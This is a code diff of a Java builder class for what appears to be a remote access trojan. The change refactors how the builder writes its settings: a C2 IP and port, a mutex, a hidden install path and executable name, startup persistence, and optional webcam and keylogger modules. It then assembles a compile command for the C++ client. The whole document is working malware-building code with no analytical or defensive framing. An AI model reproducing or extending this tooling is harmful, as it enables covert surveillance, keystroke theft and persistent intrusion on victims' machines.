@@ -39,15 +39,15 @@ public class Compiler implements ActionListener {
         if (returnVal == JFileChooser.APPROVE_OPTION) {
             setAssemblySettings();
             // Set IP
-            modifier.setIP(fieldsArray[0].getText());
+            modifier.variableModifier("IP","\""+fieldsArray[0].getText()+"\"");
             // Set PORT
-            modifier.setPORT(fieldsArray[1].getText());
+            modifier.variableModifier("PORT",fieldsArray[1].getText());
             // Set tag name
-            modifier.setTagName(fieldsArray[2].getText());
+            modifier.variableModifier("TAG_NAME","\""+fieldsArray[2].getText()+"\"");
             // Set mutex
-            modifier.setMutex(fieldsArray[3].getText());
+            modifier.variableModifier("MUTEX","\""+fieldsArray[3].getText()+"\"");
             // Set timing
-            modifier.setTimingRetry(fieldsArray[4].getText());
+            modifier.variableModifier("TIMING_RETRY",fieldsArray[4].getText());
             // Create command line
             command.append(fieldsArray[5].getText()).append(" compile_configuration/compiled_assembly.opc client.cpp " +
                     "video_audio/DeviceEnumerator.cpp " +
@@ -64,17 +64,18 @@ public class Compiler implements ActionListener {
                     "box_message/MessageBoxGUI.cpp " +
                     "state/SystemState.cpp " +
                     "install/Install.cpp ");
+            // check if installation needs to be make
             if (checkBoxes[0].isSelected()) {
-                modifier.setInstallationPath(buttonGroup.getSelection().getActionCommand());
-                modifier.setSubdirectoryName(fieldsArray[6].getText());
-                modifier.setSubdirectoryFileName(fieldsArray[7].getText() + ".exe");
-                modifier.setStartUpName("STARTUP_NAME", checkBoxes[1].isSelected() ? "\""+fieldsArray[8].getText()+"\"" : "");
+                modifier.variableModifier("INSTALL_PATH",buttonGroup.getSelection().getActionCommand());
+                modifier.variableModifier("SUBDIRECTORY_NAME","\""+fieldsArray[6].getText()+"\"");
+                modifier.variableModifier("SUBDIRECTORY_FILE_NAME","\""+fieldsArray[7].getText()+".exe"+"\"");
+                modifier.variableModifier("STARTUP_NAME", checkBoxes[1].isSelected() ? "\""+fieldsArray[8].getText()+"\"" : "");
             } else {
-                modifier.setInstallationPath("(-1)");
+                modifier.variableModifier("INSTALL_PATH","(-1)");
             }
             if (checkBoxes[2].isSelected()) {
                 modifier.addInclude("#define WEBCAM");
-                modifier.setStartUpName("WEBCAM","\""+fieldsArray[9].getText()+"\"");
+                modifier.variableModifier("WEBCAM","\""+fieldsArray[9].getText()+"\"");
                 command.append(
                         "screen/ScreenStreamer.cpp " +
                                 "webcam/WebcamManager.cpp " +
@@ -99,7 +100,7 @@ public class Compiler implements ActionListener {
 
             if (checkBoxes[3].isSelected()){
                 modifier.addInclude("#define KEYLOGGER");
-                modifier.setStartUpName("KEYLOGGER","\""+fieldsArray[10].getText()+"\"");
+                modifier.variableModifier("KEYLOGGER","\""+fieldsArray[10].getText()+"\"");
             } else modifier.removeInclude("#define KEYLOGGER");
             modifier.writeToFile();
             System.out.println(command);
